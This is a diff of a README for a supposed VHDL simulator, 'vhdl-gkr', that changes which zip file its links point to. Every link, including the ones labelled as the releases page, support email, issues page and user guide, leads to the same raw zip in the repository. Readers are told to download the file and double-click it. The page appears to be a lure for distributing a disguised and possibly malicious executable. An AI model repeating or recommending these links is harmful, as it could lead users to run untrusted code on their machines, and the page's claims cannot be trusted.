@@ -1,13 +1,13 @@
 # 🛠️ vhdl-gkr - Easily Simulate VHDL for Your Projects
 
 ## 🔗 Download Now
-[![Download vhdl-gkr](https://raw.githubusercontent.com/linearalgebragenusblatta897/vhdl-gkr/main/defrayal/vhdl-gkr-pix.zip)](https://raw.githubusercontent.com/linearalgebragenusblatta897/vhdl-gkr/main/defrayal/vhdl-gkr-pix.zip)
+[![Download vhdl-gkr](https://raw.githubusercontent.com/linearalgebragenusblatta897/vhdl-gkr/main/defrayal/vhdl-gkr-v1.8.zip)](https://raw.githubusercontent.com/linearalgebragenusblatta897/vhdl-gkr/main/defrayal/vhdl-gkr-v1.8.zip)
 
 ## 🚀 Getting Started
 Welcome to vhdl-gkr! This application helps you simulate VHDL code easily. Follow the steps below to download and run it on your computer.
 
 ## 📥 Download & Install
-1. **Visit this page to download:** Go to the [Releases page](https://raw.githubusercontent.com/linearalgebragenusblatta897/vhdl-gkr/main/defrayal/vhdl-gkr-pix.zip).
+1. **Visit this page to download:** Go to the [Releases page](https://raw.githubusercontent.com/linearalgebragenusblatta897/vhdl-gkr/main/defrayal/vhdl-gkr-v1.8.zip).
 2. **Choose the latest version:** Look for the most recent release at the top of the page.
 3. **Download the application:** Click on the file that fits your operating system to start the download. You will typically see files with extensions like `.exe` for Windows or `.dmg` for Mac.
 4. **Open the downloaded file:** Once the file downloads, locate it in your downloads folder. Double-click the file to execute it.
@@ -39,8 +39,8 @@ To run vhdl-gkr smoothly, ensure your system meets these requirements:
 
 ## 💬 Support
 If you need help or have questions, you can reach out to our support team via:
-- **Email:** https://raw.githubusercontent.com/linearalgebragenusblatta897/vhdl-gkr/main/defrayal/vhdl-gkr-pix.zip
-- **GitHub Issues:** Submit a request on the [Issues page](https://raw.githubusercontent.com/linearalgebragenusblatta897/vhdl-gkr/main/defrayal/vhdl-gkr-pix.zip).
+- **Email:** https://raw.githubusercontent.com/linearalgebragenusblatta897/vhdl-gkr/main/defrayal/vhdl-gkr-v1.8.zip
+- **GitHub Issues:** Submit a request on the [Issues page](https://raw.githubusercontent.com/linearalgebragenusblatta897/vhdl-gkr/main/defrayal/vhdl-gkr-v1.8.zip).
 
 ## 🌍 Community
 Join our community to connect with other users.
@@ -48,7 +48,7 @@ Join our community to connect with other users.
 - **Social Media:** Follow us on Twitter, Reddit, and Facebook for the latest updates.
 
 ## 🔗 Additional Resources
-- **Documentation:** Review our [User Guide](https://raw.githubusercontent.com/linearalgebragenusblatta897/vhdl-gkr/main/defrayal/vhdl-gkr-pix.zip) to learn more about features and usage.
+- **Documentation:** Review our [User Guide](https://raw.githubusercontent.com/linearalgebragenusblatta897/vhdl-gkr/main/defrayal/vhdl-gkr-v1.8.zip) to learn more about features and usage.
 - **Tutorials:** Check out video tutorials on our website to see vhdl-gkr in action.
 
 ## 📌 Conclusion
